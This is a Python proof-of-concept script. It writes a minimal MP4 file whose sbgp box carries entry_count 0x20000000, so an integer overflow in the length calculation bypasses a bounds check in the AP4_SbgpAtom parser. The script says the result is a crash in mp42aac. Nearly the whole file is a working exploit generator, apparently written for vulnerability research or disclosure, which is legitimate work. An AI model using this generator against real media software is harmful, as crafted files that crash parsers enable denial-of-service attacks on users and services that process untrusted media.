#!/usr/bin/env python3
"""
PoC generator for VULN 003 — AP4_SbgpAtom Bounds-Check Integer Overflow
Crafts a minimal MP4 file with a malicious sbgp box where entry_count=0x20000000,
causing entry_count*8 to overflow to 0 in uint32_t arithmetic, bypassing the bounds check.
"""
import struct
import os

def box(box_type, data):
    """Build a box: 4B size + 4B type + data"""
    assert len(box_type) == 4
    size = 4 + 4 + len(data)
    return struct.pack('>I', size) + box_type + data

def fullbox(box_type, version, flags, data):
    """Build a fullbox: box header + 1B version + 3B flags + data"""
    fb_data = struct.pack('>I', (version << 24) | (flags & 0xFFFFFF)) + data
    return box(box_type, fb_data)

def build_ftyp():
    data = b'isom'                   # major brand
    data += struct.pack('>I', 0x200) # minor version
    data += b'isom'                  # compatible brand
    return box(b'ftyp', data)

def build_mvhd():
    # version=0, flags=0
    data = struct.pack('>I', 0)      # creation_time
    data += struct.pack('>I', 0)     # modification_time
    data += struct.pack('>I', 1000)  # timescale
    data += struct.pack('>I', 0)     # duration
    data += struct.pack('>i', 0x00010000)  # rate (1.0)
    data += struct.pack('>h', 0x0100)      # volume (1.0)
    data += b'\x00' * 10             # reserved
    # matrix
    data += struct.pack('>9i', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
    data += b'\x00' * 24             # pre_defined
    data += struct.pack('>I', 2)     # next_track_id
    return fullbox(b'mvhd', 0, 0, data)

def build_tkhd():
    # version=0, flags=0x0f (track enabled, in movie, in preview)
    data = struct.pack('>I', 0)      # creation_time
    data += struct.pack('>I', 0)     # modification_time
    data += struct.pack('>I', 1)     # track_id
    data += struct.pack('>I', 0)     # reserved
    data += struct.pack('>I', 0)     # duration
    data += b'\x00' * 8              # reserved
    data += struct.pack('>h', 0)     # layer
    data += struct.pack('>h', 0)     # alternate_group
    data += struct.pack('>h', 0x0100)# volume
    data += struct.pack('>H', 0)     # reserved
    # matrix
    data += struct.pack('>9i', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
    data += struct.pack('>I', 0)     # width
    data += struct.pack('>I', 0)     # height
    return fullbox(b'tkhd', 0, 0x0f, data)

def build_mdhd():
    # version=0
    data = struct.pack('>I', 0)      # creation_time
    data += struct.pack('>I', 0)     # modification_time
    data += struct.pack('>I', 44100) # timescale
    data += struct.pack('>I', 0)     # duration
    data += struct.pack('>H', 0x55C4)# language (und)
    data += struct.pack('>H', 0)     # pre_defined
    return fullbox(b'mdhd', 0, 0, data)

def build_hdlr():
    data = struct.pack('>I', 0)      # pre_defined
    data += b'soun'                  # handler_type
    data += b'\x00' * 12            # reserved
    data += b'\x00'                  # name (null terminator)
    return fullbox(b'hdlr', 0, 0, data)

def build_smhd():
    data = struct.pack('>H', 0)      # balance
    data += struct.pack('>H', 0)     # reserved
    return fullbox(b'smhd', 0, 0, data)

def build_url_entry():
    # url. entry with self-contained flag=1
    return fullbox(b'url ', 0, 1, b'')

def build_dref():
    data = struct.pack('>I', 1)      # entry_count=1
    data += build_url_entry()
    return fullbox(b'dref', 0, 0, data)

def build_dinf():
    return box(b'dinf', build_dref())

def build_stsd():
    data = struct.pack('>I', 0)      # entry_count=0
    return fullbox(b'stsd', 0, 0, data)

def build_stts():
    data = struct.pack('>I', 0)      # entry_count=0
    return fullbox(b'stts', 0, 0, data)

def build_stsc():
    data = struct.pack('>I', 0)      # entry_count=0
    return fullbox(b'stsc', 0, 0, data)

def build_stsz():
    data = struct.pack('>I', 0)      # sample_size=0
    data += struct.pack('>I', 0)     # sample_count=0
    return fullbox(b'stsz', 0, 0, data)

def build_stco():
    data = struct.pack('>I', 0)      # entry_count=0
    return fullbox(b'stco', 0, 0, data)

def build_sbgp_malicious():
    """
    Build malicious sbgp box:
    - version=0, flags=0
    - grouping_type = 'roll'
    - entry_count = 0x20000000  (triggers integer overflow: 0x20000000*8 = 0 in uint32_t)
    - 8 dummy bytes after entry_count so remains > 0 at the check point

    After reading grouping_type(4B) and entry_count(4B), remains = box_data_size - 8.
    We add 8 dummy bytes so remains = 8 > 0, bypassing 'if (remains < entry_count*8)'.
    """
    data = b'roll'                           # grouping_type
    data += struct.pack('>I', 0x20000000)    # entry_count (OVERFLOW TRIGGER)
    data += b'\x00' * 8                     # dummy data (ensures remains > 0)
    return fullbox(b'sbgp', 0, 0, data)

def build_stbl():
    data = build_stsd()
    data += build_stts()
    data += build_stsc()
    data += build_stsz()
    data += build_stco()
    data += build_sbgp_malicious()
    return box(b'stbl', data)

def build_minf():
    data = build_smhd()
    data += build_dinf()
    data += build_stbl()
    return box(b'minf', data)

def build_mdia():
    data = build_mdhd()
    data += build_hdlr()
    data += build_minf()
    return box(b'mdia', data)

def build_trak():
    data = build_tkhd()
    data += build_mdia()
    return box(b'trak', data)

def build_moov():
    data = build_mvhd()
    data += build_trak()
    return box(b'moov', data)

def main():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    output_path = os.path.join(script_dir, 'vuln_003.mp4')

    mp4_data = build_ftyp()
    mp4_data += build_moov()

    with open(output_path, 'wb') as f:
        f.write(mp4_data)

    print(f"Written {len(mp4_data)} bytes to {output_path}")
    print(f"sbgp entry_count = 0x20000000, entry_count*8 overflows to 0 in uint32_t")
    print(f"Expected: OOM / bad_alloc crash or NULL deref in mp42aac")

if __name__ == '__main__':
    main()
